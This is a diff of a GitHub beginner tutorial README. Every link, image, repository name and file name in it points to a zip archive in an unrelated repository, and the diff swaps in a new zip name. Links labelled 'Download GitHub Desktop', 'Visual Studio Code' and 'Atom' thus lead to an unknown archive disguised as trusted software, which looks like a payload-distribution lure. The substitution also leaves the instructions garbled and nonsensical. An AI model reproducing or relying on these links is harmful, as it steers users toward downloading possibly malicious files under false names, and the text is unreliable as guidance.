@@ -10,29 +10,29 @@ This repository contains three important files: The HTML code for your first web
 
 ## Describe your project
 
-You are currently viewing your project's **README** file. **_README_** files are like cover pages or elevator pitches for your project. They are written in plain text or [Markdown language](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip), and usually include a paragraph describing the project, directions on how to use it, who authored it, and more.
+You are currently viewing your project's **README** file. **_README_** files are like cover pages or elevator pitches for your project. They are written in plain text or [Markdown language](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip), and usually include a paragraph describing the project, directions on how to use it, who authored it, and more.
 
-[Learn more about READMEs](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip)
+[Learn more about READMEs](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip)
 
 ## Your first website
 
 **GitHub Pages** is a free and easy way to create a website using the code that lives in your GitHub repositories. You can use GitHub Pages to build a portfolio of your work, create a personal website, or share a fun project that you coded with the world. GitHub Pages is automatically enabled in this repository, but when you create new repositories in the future, the steps to launch a GitHub Pages website will be slightly different.
 
-[Learn more about GitHub Pages](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip)
+[Learn more about GitHub Pages](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip)
 
 ## Rename this repository to publish your site
 
-We've already set-up a GitHub Pages website for you, based on your personal username. This repository is called `hello-world`, but you'll rename it to: `https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip`, to match your website's URL address. If the first part of the repository doesn’t exactly match your username, it won’t work, so make sure to get it right.
+We've already set-up a GitHub Pages website for you, based on your personal username. This repository is called `hello-world`, but you'll rename it to: `https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip`, to match your website's URL address. If the first part of the repository doesn’t exactly match your username, it won’t work, so make sure to get it right.
 
 Let's get started! To update this repository’s name, click the `Settings` tab on this page. This will take you to your repository’s settings page. 
 
-![repo-settings-image](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip)
+![repo-settings-image](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip)
 
-Under the **Repository Name** heading, type: `https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip`, where username is your username on GitHub. Then click **Rename**—and that’s it. When you’re done, click your repository name or browser’s back button to return to this page.
+Under the **Repository Name** heading, type: `https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip`, where username is your username on GitHub. Then click **Rename**—and that’s it. When you’re done, click your repository name or browser’s back button to return to this page.
 
-<img width="1039" alt="rename_screenshot" src="https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip">
+<img width="1039" alt="rename_screenshot" src="https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip">
 
-Once you click **Rename**, your website will automatically be published at: https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip The HTML file—called `https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip`—is rendered as the home page and you'll be making changes to this file in the next step.
+Once you click **Rename**, your website will automatically be published at: https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip The HTML file—called `https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip`—is rendered as the home page and you'll be making changes to this file in the next step.
 
 Congratulations! You just launched your first GitHub Pages website. It's now live to share with the entire world
 
@@ -44,7 +44,7 @@ With each commit, you have the opportunity to write a **commit message**, a shor
 
 ## Practice: Customize your first GitHub website by writing HTML code
 
-Want to edit the site you just published? Let’s practice commits by introducing yourself in your `https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip` file. Don’t worry about getting it right the first time—you can always build on your introduction later.
+Want to edit the site you just published? Let’s practice commits by introducing yourself in your `https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip` file. Don’t worry about getting it right the first time—you can always build on your introduction later.
 
 Let’s start with this template:
 
@@ -52,9 +52,9 @@ Let’s start with this template:
 <p>Hello World! I’m [username]. This is my website!</p>
 ```
 
-To add your introduction, copy our template and click the edit pencil icon at the top right hand corner of the `https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip` file.
+To add your introduction, copy our template and click the edit pencil icon at the top right hand corner of the `https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip` file.
 
-<img width="997" alt="edit-this-file" src="https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip">
+<img width="997" alt="edit-this-file" src="https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip">
 
 
 Delete this placeholder line:
@@ -65,13 +65,13 @@ Delete this placeholder line:
 
 Then, paste the template to line 15 and fill in the blanks.
 
-<img width="1032" alt="edit-githuboctocat-index" src="https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip">
+<img width="1032" alt="edit-githuboctocat-index" src="https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip">
 
 
 When you’re done, scroll down to the `Commit changes` section near the bottom of the edit page. Add a short message explaining your change, like "Add my introduction", then click `Commit changes`.
 
 
-<img width="1030" alt="add-my-username" src="https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip">
+<img width="1030" alt="add-my-username" src="https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip">
 
 Once you click `Commit changes`, your changes will automatically be published on your GitHub Pages website. Refresh the page to see your new changes live in action.
 
@@ -79,45 +79,45 @@ Once you click `Commit changes`, your changes will automatically be published on
 
 ## Work with GitHub on your computer using GitHub Desktop
 
-**GitHub Desktop** is a free app from GitHub for Windows and Mac that allows you to easily work with your GitHub repositories from your computer. You just saw how you can commit to a repository from https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip, but most developers do the majority of their work from their computer (locally) before pushing it up to GitHub. So let’s try that out!
+**GitHub Desktop** is a free app from GitHub for Windows and Mac that allows you to easily work with your GitHub repositories from your computer. You just saw how you can commit to a repository from https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip, but most developers do the majority of their work from their computer (locally) before pushing it up to GitHub. So let’s try that out!
 
-[Download GitHub Desktop](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip)
+[Download GitHub Desktop](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip)
 
 ## Practice: Use GitHub Desktop and an editor to make a change from your computer
 
-Start by downloading GitHub Desktop if you haven’t already done so, and install it on your computer. Go through the GitHub Desktop onboarding steps, and when you get to the “Let’s get started” screen, go ahead and choose the repository you were just working with on https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip, and click “Clone.”
+Start by downloading GitHub Desktop if you haven’t already done so, and install it on your computer. Go through the GitHub Desktop onboarding steps, and when you get to the “Let’s get started” screen, go ahead and choose the repository you were just working with on https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip, and click “Clone.”
 
 ### Using an editor to make changes
 
-Let’s make sure you have a text editor on your computer - this is what you'll use to actually make changes to your files. If you already know you have an editor, then skip to the next step. Otherwise, download and install either [Visual Studio Code](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip) or [Atom](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip) and restart GitHub Desktop before proceeding to the next step.
+Let’s make sure you have a text editor on your computer - this is what you'll use to actually make changes to your files. If you already know you have an editor, then skip to the next step. Otherwise, download and install either [Visual Studio Code](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip) or [Atom](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip) and restart GitHub Desktop before proceeding to the next step.
 
-Let’s make a change to your GitHub Pages site, just like you did on https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip, except this time we’re going to do it all from your computer. From GitHub Desktop, click the “Open in…” button in the middle of the screen to “open the repository in your external editor” that you just downloaded. 
+Let’s make a change to your GitHub Pages site, just like you did on https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip, except this time we’re going to do it all from your computer. From GitHub Desktop, click the “Open in…” button in the middle of the screen to “open the repository in your external editor” that you just downloaded. 
 
-![Open-in-editor](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip)
+![Open-in-editor](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip)
 
-In the left sidebar, click the `https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip` file to open it, and go ahead and add another line. Maybe, “Building websites is fun! You should try it too!” or whatever you want to add. 
+In the left sidebar, click the `https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip` file to open it, and go ahead and add another line. Maybe, “Building websites is fun! You should try it too!” or whatever you want to add. 
 
-![Make-changes](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip)
+![Make-changes](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip)
 
 Now switch back to GitHub Desktop, and you should see the change you made.
 
-![View-changes](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip)
+![View-changes](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip)
 
 ### Commit your changes
 
 Now you can commit your changes by typing a message in the `Summary` box at the bottom left, and then click the blue `Commit` button below that.
 
-![Commit-changes](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip)
+![Commit-changes](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip)
 
-### Push your changes to https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip
+### Push your changes to https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip
 
-One of the great things about working on things on your computer is that you get to control when other people see them. Now let’s push your commit to https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip as well so it’s saved there and you can publish it to your site. Click the “Push origin” button to push your commit to https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip 
+One of the great things about working on things on your computer is that you get to control when other people see them. Now let’s push your commit to https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip as well so it’s saved there and you can publish it to your site. Click the “Push origin” button to push your commit to https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip 
 
-![Push-to-GitHub](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip)
+![Push-to-GitHub](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip)
 
-Now click the “View on GitHub” button to get back to your repository’s page on https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip
+Now click the “View on GitHub” button to get back to your repository’s page on https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip
 
-![View-on-GitHub](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip)
+![View-on-GitHub](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip)
 
 ### Deploy and see your changes live on your GitHub Pages website!
 
@@ -125,16 +125,16 @@ Once you commit your changes, they are automatically published on your GitHub Pa
 
 ### Celebrate!
 
-Hooray! Now you have your repository linked between your computer and https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip In the future, you can use GitHub Desktop to push any changes you decide to make from your computer.
+Hooray! Now you have your repository linked between your computer and https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip In the future, you can use GitHub Desktop to push any changes you decide to make from your computer.
 
 ## Extra Credit: Keep on building!
 
-Change the placeholder Octocat gif on your GitHub Pages website by [creating your own personal Octocat emoji](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip) or [choose a different Octocat gif from our logo library here](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip). Add that image to line 12 of your `https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip` file, in place of the `<img src=` link.
+Change the placeholder Octocat gif on your GitHub Pages website by [creating your own personal Octocat emoji](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip) or [choose a different Octocat gif from our logo library here](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip). Add that image to line 12 of your `https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip` file, in place of the `<img src=` link.
 
-Want to add even more code and fun styles to your GitHub Pages website? [Follow these instructions](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip) to build a fully-fledged static website.
+Want to add even more code and fun styles to your GitHub Pages website? [Follow these instructions](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip) to build a fully-fledged static website.
 
-![octocat](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip)
+![octocat](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip)
 
 ## Everything you need to know about GitHub
 
-Getting started is the hardest part. If there’s anything you’d like to know as you get started with GitHub, try searching [GitHub Help](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI-Multi-Agent-v3.8-alpha.5.zip). Our documentation has tutorials on everything from changing your repository settings to configuring GitHub from your command line.
+Getting started is the hardest part. If there’s anything you’d like to know as you get started with GitHub, try searching [GitHub Help](https://raw.githubusercontent.com/Albertossilva-maker/MultiAgent-AI/master/images/AI_Agent_Multi_baboon.zip). Our documentation has tutorials on everything from changing your repository settings to configuring GitHub from your command line.
